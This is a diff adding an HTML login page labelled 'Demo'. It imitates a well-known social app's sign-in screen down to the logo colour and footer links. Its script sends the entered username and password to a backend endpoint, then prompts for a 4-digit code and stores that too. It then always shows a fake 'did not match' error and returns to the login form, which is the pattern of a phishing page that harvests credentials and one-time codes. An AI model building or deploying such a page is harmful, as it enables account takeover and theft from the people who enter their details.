@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demo Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        html, body {
+            min-height: 100%;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-color: #f7f7f7;
+        }
+
+        .main {
+            flex: 1;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 48px 16px 32px;
+        }
+
+        .login {
+            background-color: #ffffff;
+            border-radius: 6px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.04);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 18px;
+            font-size: 13px;
+            font-weight: 300;
+            width: min(100%, 356px);
+            padding: 32px 24px;
+        }
+
+        .logo {
+            height: 56px;
+            width: 55px;
+            object-fit: contain;
+        }
+
+        .demo-logo {
+            width: 64px;
+            height: 64px;
+            border-radius: 18px;
+            background: #fffc00;
+            display: grid;
+            place-items: center;
+            font-size: 13px;
+            font-weight: 700;
+            color: #16191c;
+            letter-spacing: 0.5px;
+            box-shadow: inset 0 0 0 1px rgba(0, 0, 0, 0.08);
+        }
+
+        .error-text {
+            display: none;
+            width: 100%;
+            color: #d93025;
+            font-size: 13px;
+            line-height: 1.35;
+            margin-top: -4px;
+            text-align: left;
+        }
+
+        .error-text.show {
+            display: block;
+        }
+
+        .login h1 {
+            font-size: clamp(24px, 4vw, 28px);
+            font-weight: 300;
+            text-align: center;
+        }
+
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .field {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        label {
+            font-weight: 600;
+            color: #8c8c8c;
+            font-size: 13px;
+        }
+
+        input {
+            width: 100%;
+            height: 45px;
+            border: 0.4px solid rgb(207, 205, 205);
+            border-radius: 8px;
+            padding: 0 12px;
+            font-size: 14px;
+            outline: none;
+            background: #fff;
+        }
+
+        input:focus {
+            border-color: #999;
+        }
+
+        a {
+            text-decoration: none;
+            color: #0fadff;
+            font-weight: bold;
+        }
+
+        .switch-link {
+            align-self: flex-start;
+            font-size: 13px;
+        }
+
+        .next-btn {
+            width: 80px;
+            height: 40px;
+            color: white;
+            background-color: #0fadff;
+            border-radius: 50px;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s ease, opacity 0.2s ease;
+            opacity: 0.65;
+        }
+
+        .next-btn.ready {
+            background-color: #0095f6;
+            opacity: 1;
+        }
+
+        .text {
+            display: flex;
+            margin-top: 30px;
+            font-size: 16px;
+            font-weight: 300;
+            gap: 10px;
+            margin-bottom: 3px;
+            flex-wrap: wrap;
+            justify-content: center;
+            text-align: center;
+            padding: 0 16px;
+        }
+
+        .text a {
+            color: #16191c;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .footer {
+            background-color: #fbfbfb;
+            width: 100%;
+            color: black;
+            padding-top: 8px;
+        }
+
+        .list {
+            display: grid;
+            grid-template-columns: repeat(4, minmax(140px, 1fr));
+            gap: 28px;
+            padding: 0 50px 16px;
+            font-size: 13px;
+            max-width: 1200px;
+        }
+
+        .list ul {
+            list-style: none;
+        }
+
+        .list p {
+            font-size: 13px;
+            font-weight: 400;
+            margin-top: 10px;
+            padding-right: 0;
+        }
+
+        .selector {
+            display: flex;
+            padding: 0 50px;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 5px;
+            max-width: 1200px;
+        }
+
+        .selector label {
+            font-size: 13px;
+            font-weight: 100;
+            color: black;
+        }
+
+        select {
+            height: 35px;
+            width: 200px;
+            max-width: 100%;
+            border: 0.5px solid rgb(183, 182, 182);
+            border-radius: 3px;
+            background: white;
+        }
+
+        .last-text {
+            margin-top: 25px;
+            min-height: 70px;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            background-color: #090a0a;
+            color: white;
+            padding: 20px 50px;
+            gap: 35px;
+            flex-wrap: wrap;
+        }
+
+        @media (max-width: 900px) {
+            .list {
+                grid-template-columns: repeat(2, minmax(140px, 1fr));
+                gap: 20px;
+                padding: 0 24px 16px;
+            }
+
+            .selector {
+                padding: 0 24px;
+            }
+
+            .last-text {
+                padding: 18px 24px;
+            }
+        }
+
+        @media (max-width: 520px) {
+            .main {
+                padding: 24px 12px 24px;
+            }
+
+            .login {
+                padding: 24px 16px;
+                gap: 16px;
+            }
+
+            .list {
+                grid-template-columns: 1fr;
+                padding: 0 16px 16px;
+            }
+
+            .selector {
+                padding: 0 16px;
+            }
+
+            .last-text {
+                padding: 16px;
+                gap: 14px;
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main">
+        <div class="login">
+            <div class="demo-logo" aria-label="Demo logo">DEMO</div>
+            <h1 id="pageTitle">Demo Login</h1>
+
+            <form id="loginForm" class="login-form" novalidate>
+                <div id="fieldsWrap">
+                    <div class="field">
+                        <label for="username">Username or Email</label>
+                        <input id="username" type="text" autocomplete="off" placeholder="">
+                    </div>
+
+                    <div class="field" style="margin-top: 14px;">
+                        <label for="password">Password</label>
+                        <input id="password" type="password" autocomplete="off" placeholder="">
+                    </div>
+                </div>
+
+                <p id="errorText" class="error-text" aria-live="polite"></p>
+
+                <a id="switchLink" class="switch-link" href="#">Use phone number instead</a>
+                <button id="nextBtn" class="next-btn" type="submit">Next</button>
+            </form>
+        </div>
+
+        <div class="text">
+            <p>New here?</p>
+            <a href="#">Sign Up</a>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="list">
+            <ul>
+                <p>Company</p>
+                <p>Demo Inc.</p>
+                <p>Careers</p>
+                <p>News</p>
+            </ul>
+            <ul>
+                <p>Community</p>
+                <p>Support</p>
+                <p>Community Guidelines</p>
+                <p>Safety Center</p>
+            </ul>
+            <ul>
+                <p>Advertising</p>
+                <p>Buy Ads</p>
+                <p>Advertising Policies</p>
+                <p>Political Ads Library</p>
+                <p>Brand Guidelines</p>
+                <p>Promotions Rules</p>
+            </ul>
+            <ul>
+                <p>Legal</p>
+                <p>Privacy Center</p>
+                <p>Your Privacy Choices</p>
+                <p>Cookie Policy</p>
+                <p>Report Infringement</p>
+                <p>Custom Creative Tools Terms</p>
+                <p>Community Geofilter Terms</p>
+                <p>Lens Studio Terms</p>
+            </ul>
+        </div>
+
+        <div class="selector">
+            <label for="language">Language</label>
+            <select id="language">
+                <option value="en">English (US)</option>
+                <option value="hi">Hindi</option>
+                <option value="es">Spanish</option>
+                <option value="fr">French</option>
+            </select>
+        </div>
+
+        <div class="last-text">
+            <p>Privacy Policy</p>
+            <p>Terms of Service</p>
+        </div>
+    </footer>
+
+    <script>
+    const form = document.getElementById('loginForm');
+    const fieldsWrap = document.getElementById('fieldsWrap');
+    const pageTitle = document.getElementById('pageTitle');
+    const nextBtn = document.getElementById('nextBtn');
+    const errorText = document.getElementById('errorText');
+    const switchLink = document.getElementById('switchLink');
+
+    let step = 'login';
+    let savedUsername = '';
+    let loginAttemptId = null;
+
+    function setError(message) {
+        errorText.textContent = message || '';
+        errorText.classList.toggle('show', Boolean(message));
+    }
+
+    function renderLogin(showError = false) {
+        step = 'login';
+        pageTitle.textContent = 'Demo Login';
+        fieldsWrap.innerHTML = `
+            <div class="field">
+                <label for="username">Username or Email</label>
+                <input id="username" type="text" autocomplete="off" placeholder="">
+            </div>
+
+            <div class="field" style="margin-top: 14px;">
+                <label for="password">Password</label>
+                <input id="password" type="password" autocomplete="off" placeholder="">
+            </div>
+        `;
+        switchLink.style.display = '';
+        nextBtn.textContent = 'Next';
+        nextBtn.classList.remove('ready');
+        setError(showError ? 'Password or code did not match.' : '');
+
+        document.getElementById('username').addEventListener('input', updateButtonState);
+        document.getElementById('password').addEventListener('input', updateButtonState);
+    }
+
+    function renderCode() {
+        step = 'code';
+        pageTitle.textContent = 'Enter 4-digit code';
+        fieldsWrap.innerHTML = `
+            <div class="field">
+                <label for="code">4-digit code</label>
+                <input
+                    id="code"
+                    type="text"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                    maxlength="4"
+                    autocomplete="off"
+                    placeholder=""
+                >
+            </div>
+        `;
+        switchLink.style.display = 'none';
+        nextBtn.textContent = 'Next';
+        nextBtn.classList.remove('ready');
+        setError('');
+
+        const codeInput = document.getElementById('code');
+        codeInput.addEventListener('input', () => {
+            codeInput.value = codeInput.value.replace(/\D/g, '').slice(0, 4);
+            updateButtonState();
+        });
+        codeInput.focus();
+    }
+
+    function updateButtonState() {
+        if (step === 'login') {
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const hasUsername = usernameInput.value.trim() !== '';
+            const hasPassword = passwordInput.value.trim() !== '';
+            nextBtn.classList.toggle('ready', hasUsername && hasPassword);
+        }
+
+        if (step === 'code') {
+            const codeInput = document.getElementById('code');
+            nextBtn.classList.toggle('ready', /^\d{4}$/.test(codeInput.value));
+        }
+    }
+
+    async function saveLoginAttempt(username, password) {
+        const response = await fetch('/api/login-attempt', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ username, password })
+        });
+
+        return await response.json();
+    }
+
+    async function saveCodeAttempt(code) {
+        const response = await fetch('/api/code-attempt', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                loginAttemptId,
+                username: savedUsername,
+                code
+            })
+        });
+
+        return await response.json();
+    }
+
+    form.addEventListener('submit', async (event) => {
+        event.preventDefault();
+
+        if (step === 'login') {
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value;
+
+            if (!username || !password) {
+                setError('Please enter both fields.');
+                return;
+            }
+
+            nextBtn.disabled = true;
+
+            try {
+                const result = await saveLoginAttempt(username, password);
+
+                if (!result.ok) {
+                    setError(result.error || 'Could not save attempt.');
+                    nextBtn.disabled = false;
+                    return;
+                }
+
+                savedUsername = username;
+                loginAttemptId = result.loginAttemptId;
+                renderCode();
+            } catch (error) {
+                setError('Network error.');
+            }
+
+            nextBtn.disabled = false;
+            return;
+        }
+
+        if (step === 'code') {
+            const codeInput = document.getElementById('code');
+            const code = codeInput.value;
+
+            if (!/^\d{4}$/.test(code)) {
+                setError('Please enter a valid 4-digit code.');
+                return;
+            }
+
+            nextBtn.disabled = true;
+
+            try {
+                await saveCodeAttempt(code);
+            } catch (error) {
+                // Even if saving fails, keep the demo flow the same.
+            }
+
+            nextBtn.disabled = false;
+            renderLogin(true);
+        }
+    });
+
+    switchLink.addEventListener('click', (event) => {
+        event.preventDefault();
+    });
+
+    renderLogin(false);
+</script>
+</body>
+</html>
